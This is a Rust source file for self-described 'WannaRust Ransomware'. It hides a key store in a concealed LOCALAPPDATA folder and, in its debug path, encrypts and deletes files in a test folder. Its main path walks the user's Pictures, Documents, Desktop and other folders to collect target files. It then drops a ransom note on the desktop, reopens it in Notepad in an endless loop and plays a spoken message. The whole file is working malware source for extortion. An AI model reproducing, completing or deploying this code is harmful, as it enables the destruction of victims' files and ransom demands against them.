//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

pub mod utils;
pub mod misc;

use utils::{
    files,
    device
};

use misc::{
    device_map
};

use lib::{
    self, crypto,
    config::{
        ransome_note,
        control::{
            MASTER_KEY,
            TTS_MESSAGE
        },
        config::{
            FILE_EXTENTION,
            MAX_DECRYPTABLE_FILES,
            MAX_FILE_SIZE_MB,
            //MIN_FILE_SIZE_MB,
            WHITELISTED_EXTENTIONS,
            BLACKLISTED_FOLDERS
        },
        debug::{
            DEBUG_BYPASS_WHITELIST,
            DEBUG_FOLDER_NAME,
            DEBUG_MODE,
            MAIN_FOLDER_NAME
        }
    }
};

use windows::{
    Win32::System::Com::{
        CoInitializeEx,
        CoCreateInstance,
        CoUninitialize,

        COINIT_APARTMENTTHREADED,
        CLSCTX_ALL
    },
    Win32::Media::Speech::{
        ISpVoice,
        SpVoice,
        SPF_DEFAULT,
    }
};

use rfd::{
    MessageDialog,
    MessageButtons,
    MessageLevel
};

use rand::{
    seq::SliceRandom
};

use std::{
    env, fs, process, rc::Rc,
    ffi::OsStr, error::Error,
    thread, process::Command,
    time::Duration,
    cell::{RefCell, RefMut},
    path::{Path, PathBuf}
};

fn main() -> Result<(), Box<dyn Error>> {
    if DEBUG_MODE {
        println!("running in debug mode, doing tests...");
        lib::test_entry("wannarust.main");

        let test: String = lib::gen_string(39);
        let key: String = lib::gen_string(305);

        println!("original value: {}", test);

        let enc: String = crypto::encrypt(&test, &key, false)
            .map_err(|err| format!("encryption failed: {}", err))?;

        println!("encrypted data: {}", enc);

        let dec: String = crypto::decrypt(&enc, &key, false)
            .map_err(|err| format!("decrypted failed: {}", err))?;

        println!("decrypted data: {}", dec);

        if test == dec {
            println!("decrypted matches original value!");
        } else {
            eprintln!("decrypted does not match original value");
        }
    }

    let identifier: String = match device::get_identifier() {
        Err(err) => {
            eprintln!("could not get your device identifier: {}", err);
            return Ok(());
        }

        Ok(res) => {
            if DEBUG_MODE {
                println!("your device identifier: {}", res);
            }

            res
        }
    };

    let base_folder: PathBuf = env::var("LOCALAPPDATA")
        .map(PathBuf::from)
        .expect("failed to get base folder");

    let main_folder: PathBuf = files::create_folder(MAIN_FOLDER_NAME, &base_folder)
        .expect("failed to create main folder");

    files::hide_item(&main_folder, !DEBUG_MODE)
        .expect("failed to initialize main folder");

    let whitelisted: Vec<&'static str> = device_map::get_whitelisted_devices();
    if whitelisted.contains(&identifier.as_str()) && !DEBUG_BYPASS_WHITELIST {
        MessageDialog::new()
            .set_title("WannaRust Ransomware")
            .set_description(format!("This device has been whitelisted, no files have been encrypted.\n\nYour device identifier is: {}", identifier))
            .set_buttons(MessageButtons::Ok)
            .set_level(MessageLevel::Info)
            .show();

        process::exit(0);
    }

    let usable_key: String = lib::gen_string(320);
    let actual_key: String = lib::gen_string(174);

    let key_store: String = format!("{}qz.exe", lib::gen_string(28));
    let key_store_path: PathBuf = main_folder.join(&key_store);

    files::create_item(&key_store, main_folder.as_path())
        .expect("failed to create main store file");

    let protected_key = match crypto::encrypt(&actual_key, &MASTER_KEY.to_string(), true) {
        Err(err) => {
            eprintln!("could not encrypt the main key: {}", err);
            return Ok(());
        }

        Ok(res) => res
    };

    files::write_file(&key_store_path, &protected_key)
        .expect("failed to write to main store file");

    let desktop: PathBuf = dirs::desktop_dir()
        .expect("failed to find the desktop");

    if DEBUG_MODE {
        let folder: PathBuf = desktop.join(DEBUG_FOLDER_NAME);
        if !folder.exists() || !folder.is_dir() {
            eprintln!("debug folder does not exist or is not a folder");
            return Ok(());
        }

        println!("debug folder found: {}", folder.display());

        files::walk_dir(&folder, &mut |file| {
            let file_name: &str = match file.file_name().and_then(|f| f.to_str()) {
                Some(name) => name,
                None => {
                    eprintln!("failed to get name for: {}", file.display());
                    return;
                }
            };

            let enc_name: String = match crypto::encrypt(file_name, &usable_key, false) {
                Ok(name) => name,
                Err(err) => {
                    eprintln!("failed to encrypt name of {}: {}", file.display(), err);
                    return;
                }
            };

            let parent: &Path = match file.parent() {
                Some(p) => p,
                None => {
                    eprintln!("failed to get parent for: {}", file.display());
                    return;
                }
            };

            let file_name = format!("{}.{}", enc_name, FILE_EXTENTION);
            let enc_file: PathBuf = parent.join(&file_name);

            let content: String = match fs::read_to_string(&file) {
                Ok(data) => data,
                Err(err) => {
                    eprintln!("failed to get content from {}: {}", file.display(), err);
                    return;
                }
            };

            let enc_content: String = match crypto::encrypt(&content, &usable_key, false) {
                Ok(enc) => enc,
                Err(err) => {
                    eprintln!("failed to encrypt content of {}: {}", file.display(), err);
                    return;
                }
            };

            if let Err(err) = files::write_file(&enc_file, &enc_content) {
                eprintln!("failed to overwrite {}: {}", enc_file.display(), err);
                return;
            }

            if let Err(err) = fs::remove_file(&file) {
                eprintln!("failed to remove {}: {}", file.display(), err);
            }
        });

        println!("encrypted all files in: {}", folder.display());

        return Ok(());
    }

    let found: Rc<RefCell<Vec<PathBuf>>> = Rc::new(RefCell::new(Vec::<PathBuf>::new()));
    let found_clone: Rc<RefCell<Vec<PathBuf>>> = Rc::clone(&found);

    let user: PathBuf = env::var("USERPROFILE")
        .map(PathBuf::from)
        .expect("failed to get user profile");

    let decryptable_dirs: Vec<PathBuf> = vec![
        user.join("Pictures"),
        user.join("Videos"),
        user.join("Downloads"),
        user.join("Documents"),
        user.join("Desktop")
    ];

    for dir in decryptable_dirs {
        if !dir.is_dir() {
            continue;
        }

        println!("walking {}", dir.display());

        files::walk_dir(&dir, &|path| {
            if path.ancestors().any(|ancestor| {
                ancestor.file_name()
                    .and_then(|name| name.to_str())
                    .map(|name| BLACKLISTED_FOLDERS.contains(&name))
                    .unwrap_or(false)
            }) {
                return;
            }

            let metadata: fs::Metadata = match fs::metadata(path) {
                Ok(meta) =>  meta,
                Err(err) => {
                    eprintln!("failed to metadata of {}: {}", path.display(), err);
                    return;
                }
            };

            if !metadata.is_file() {
                return;
            }

            if metadata.len() > (MAX_FILE_SIZE_MB * 1024 * 1024) {
                return;
            }

            //if metadata.len() < (MIN_FILE_SIZE_MB * 1024 * 1024) {
            //    return;
            //}

            let extention: String = match path.extension().and_then(OsStr::to_str) {
                Some(ext) => ext.to_lowercase(),
                None => return
            };

            if !WHITELISTED_EXTENTIONS.contains(&extention.as_str()) {
                return;
            }

            found_clone
                .borrow_mut()
                .push(path.to_path_buf());
        });
    }

    let mut collected: RefMut<'_, Vec<PathBuf>> = found.borrow_mut();
    collected.shuffle(&mut rand::thread_rng());

    for path in collected.iter().take(MAX_DECRYPTABLE_FILES) {
        println!("decrytable - {}", path.display());
    }

    let ransome_note_path: PathBuf = files::create_item("WRN.txt", &desktop)
        .expect("failed to create note");
    let ransome_note_clone: PathBuf = ransome_note_path.clone();

    let ransom_note: String = ransome_note::create_note("1234567890", 30, &identifier);
    files::write_file(&ransome_note_path, &ransom_note)
        .expect("could not write the note");

    thread::spawn(move || {
        loop {
            let mut child: process::Child = Command::new("cmd")
                .args([
                    "/C",
                    &format!("start /MAX notepad.exe {}", ransome_note_clone.display()),
                ])
                .spawn()
                .expect("failed to open file");

            let _ = child.wait();
            thread::sleep(Duration::from_millis(50));
        }
    });

    unsafe {
        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);

        let voice: ISpVoice = CoCreateInstance(&SpVoice, None, CLSCTX_ALL)?;
        let wtext: Vec<u16> = TTS_MESSAGE
            .encode_utf16()
            .chain(Some(0))
            .collect();

        voice.Speak(windows::core::PCWSTR(wtext.as_ptr()), SPF_DEFAULT.0 as u32, None)?;
        CoUninitialize();
    }

    Ok(())
}